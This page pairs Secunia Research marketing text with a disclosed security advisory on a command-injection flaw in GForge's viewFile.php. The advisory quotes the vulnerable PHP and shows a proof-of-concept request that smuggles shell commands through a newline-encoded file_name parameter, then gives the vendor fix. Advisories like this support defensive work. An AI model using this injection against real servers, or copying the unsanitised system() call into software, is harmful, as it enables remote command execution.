How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Author                      	: Filippo Spike Morelli
--------------------------------------------------------------------------

--------------------------------------------------------------------------
Background
--------------------------------------------------------------------------

GForge helps you manage the entire development life cycle

GForge has tools to help your team collaborate, like message forums and
mailing lists; tools to create and control access to Source Code Management
repositories like CVS and Subversion. GForge automatically creates a
repository and controls access to it depending on the role settings of the
project.

--------------------------------------------------------------------------
Bug Description
--------------------------------------------------------------------------
The scm component shipped with gforge has a bug in the viewFile.php script.
This script is supposed to serve a file info request, outputting its
history, diffs, and all the other relevant info stored in the repository.
There is a flaw in the file_name parameter validation, so a properly
crafted url can lead to arbitrary command execution under the uid the
webserver runs as.

Files involved:
 $GFORGE/www/scm/viewFile.php
 $GFORGE/common/include/cvsweb/RCSHandler.class

The problem is in "file_name" url field not properly validated.

$GFORGE/www/scm/viewFile.php
.....
if($allow)
{
    $DHD = new DirectoryHandler();
    $FHD = new FileHandler();
    $RCH = new RCSHandler();

    $CVSROOT = $GLOBALS['sys_cvsroot_dir'].$cvsroot;
    $DIRNAME = ($file_name != "")?"$file_name":"";
    $DIRNAME = $CVSROOT.$DIRNAME;
....
    $RCSFile = $DIRNAME.",v";
    switch($view_action)
    {
        case "l":
            if(false === $RCH->getRCSLog($RCSFile))
                echo("Error: ".$RCH->getError());
.....

$GFORGE/common/include/cvsweb/RCSHandler.class
RCSHandles class takes care of managing the RCS log and diffs for the
requested
file, and it is there that the malicious code is actually executed.
......
function getRCSLog($RCSFILE,$REV="all")
    {
        $rev = "";
        if($REV != "all")
            $rev = "-r$REV";

        $file = $this->generateTemp();
        $cmd = "rlog $rev $RCSFILE > $file";
        if(false === ($result = system($cmd)))
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        {
            $this->setError("Could not execute '$cmd'");
            return false;
        }
.....

by system() the malicious code in $cmd is executed.

--------------------------------------------------------------------------
PoC
--------------------------------------------------------------------------

The analyzed command is "uname -a;id;w"

gforge/xxxx/xx/xx/gforge.log:xxx.xxx.xxx.xxx [xx/xxx/xxxx:xx:xx:xx +xxxx]
"GET /scm/viewFile.php?group_id=11&file_name=%0Auname%20-a;id;w%0a
HTTP/1.1" 200 2977
"-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; Maxthon;
.NET CLR 1.1.4322)"

----- "file_name=%0Auname%20-a;id;w%0a" -----
%0a[A] = hexadecimal code for <return>.
%20 = hexadecimal code for <space>
---> "file_name=<return>uname -a;id;w<return>"

looking at viewFile.php sourcecode:
$DIRNAME = ($file_name != "")?"$file_name":"";
so $DIRNAME = <return>uname -a;id;w<return>
$RCSFile = $DIRNAME.",v";
so $RCSFile = <return>uname -a;id;w<return>,v
...
$cmd = "rlog $rev $RCSFILE > $file";
so $cmd = rlog all <return>uname -a;id;w<return>,v  >  $file

        if(false === ($result = system($cmd)))
and then system executes:

1. rlog all which gives back an error because of the non existing path
2. <return>
3. uname -a;id;w
4. <return>
5. and eventually the last part of the string, ",v", which gives back the
error message "sh: ,v: command not found"

--------------------------------------------------------------------------
Solution
--------------------------------------------------------------------------

The vendor has been contacted and they promptly worked on a fix. At the time
of writing the debian package available on Sid (gforge  3.1-30) has been
fixed. As temporary fix it is possible to disable the scm component. Or just
upgrade to latest version.
